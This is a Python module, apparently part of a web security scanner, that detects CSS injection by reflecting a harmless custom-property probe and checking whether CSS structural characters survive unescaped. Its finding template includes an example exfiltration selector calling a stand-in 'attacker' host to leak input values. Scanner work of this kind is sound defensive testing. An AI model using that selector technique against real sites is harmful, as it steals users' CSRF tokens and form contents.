"""CSS injection engine (CWE-74 / WSTG-CLNT-05). When user input is reflected into a CSS context — inside a
`<style>...</style>` block or a `style="..."` attribute — and the CSS structural characters survive
unescaped, an attacker can inject CSS rules. That enables data exfiltration (attribute selectors +
`background:url()` leak CSRF tokens / input values character-by-character) even where script is blocked by CSP.

CONFIRMATION IS A REFLECTION-CONTEXT ORACLE (same discipline as reflected XSS, but for the STYLE context): a
unique marker carrying CSS breakout characters must reflect back inside a style context with those characters
INTACT (not HTML-entity-encoded). Reflection alone is not enough — the `{ } ;` must survive, else the value
is safely encoded. Pure logic here (payload + oracle + finding); the HTTP transport lives in tools."""
from __future__ import annotations

import re

_MARK = "apolcss"


def custom_property(token: str) -> str:
    clean = re.sub(r"[^a-zA-Z0-9_-]", "", token or "")
    return "--apolaki-%s" % (clean or "probe")


def cssom_value(token: str) -> str:
    clean = re.sub(r"[^a-zA-Z0-9_-]", "", token or "")
    return "v%s" % (clean or "probe")


def payload(token: str) -> str:
    """Set a nonce custom property in a declaration list or a new :root rule."""
    prop, value = custom_property(token), cssom_value(token)
    return "%s%s;%s:%s;} :root{%s:%s}" % (_MARK, token, prop, value, prop, value)


def _in_style_block(body: str, idx: int) -> bool:
    before = body[:idx].lower()
    o = before.rfind("<style")
    c = before.rfind("</style>")
    return o != -1 and o > c


def _in_style_attr(body: str, idx: int) -> bool:
    # crude but effective: the nearest style=" before us is not yet closed by a matching quote before us
    seg = body[max(0, idx - 200):idx].lower()
    m = list(re.finditer(r'style\s*=\s*["\']', seg))
    if not m:
        return False
    after_attr = seg[m[-1].end():]
    return '"' not in after_attr and "'" not in after_attr


def evaluate(body: str, token: str) -> dict:
    """Confirmed when the marker reflects inside a CSS context with the breakout chars unescaped."""
    mark = _MARK + token
    body = body or ""
    start = 0
    while True:
        i = body.find(mark, start)
        if i < 0:
            break
        start = i + len(mark)
        tail = body[i:i + len(payload(token)) + 16]
        # One safe reflection must not hide a later unsafe one, or vice versa.
        if "&#" in tail or "&lt;" in tail or "&#123" in tail:
            continue
        if _in_style_block(body, i) and "{" in tail and "}" in tail:
            return {"confirmed": True, "where": "style block",
                    "oracle": "input reflects inside a <style> block with CSS structure unescaped"}
        if _in_style_attr(body, i) and ";" in tail and ":" in tail:
            return {"confirmed": True, "where": "style attribute",
                    "oracle": "input reflects inside a style=\"...\" attribute with a declaration unescaped"}
    return {"confirmed": False, "oracle": "", "where": ""}


async def read_cssom(page, token: str) -> dict:
    """Read the nonce property from computed style, proving that the browser parsed the injected CSS."""
    return await page.evaluate(
        """({prop, expected}) => {
            const nodes = [document.documentElement, ...document.querySelectorAll('*')];
            for (const node of nodes) {
                const value = getComputedStyle(node).getPropertyValue(prop).trim();
                if (value === expected) {
                    return {matched: true, tag: node.tagName.toLowerCase(), id: node.id || ''};
                }
            }
            return {matched: false, tag: '', id: ''};
        }""",
        {"prop": custom_property(token), "expected": cssom_value(token)},
    )


def finding(url: str, param: str, where: str, oracle: str) -> dict:
    return {
        "title": "CSS injection in parameter '%s' (%s)" % (param, where),
        "severity": "medium", "family": "css_injection", "confidence": "confirmed", "target": url,
        "cwe": "CWE-74", "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "cvss_score": 6.1,
        "evidence": "The parameter '%s' is reflected into a CSS %s unsanitised. %s" % (param, where, oracle),
        "success_oracle": oracle,
        "reproduction_steps": ["Reflect a marker with CSS breakout characters ({ } ; :) via '%s'." % param,
                               "Confirm the characters survive unescaped in the %s." % where,
                               "Exfiltrate data with attribute selectors, e.g. "
                               "input[value^='a']{background:url(//attacker/a)}."],
        "impact": ("Inject CSS to exfiltrate sensitive DOM values (CSRF tokens, input contents) via selector-"
                   "driven background requests, deface the page, or overlay UI — works even under a script-CSP."),
        "remediation": ("Never reflect user input into a <style> block or style attribute; if unavoidable, strip "
                        "or CSS-escape { } ; : ( ) < > and enforce a CSP with a strict style-src."),
        "tags": ["css-injection", "client-side", "cwe-74"],
    }
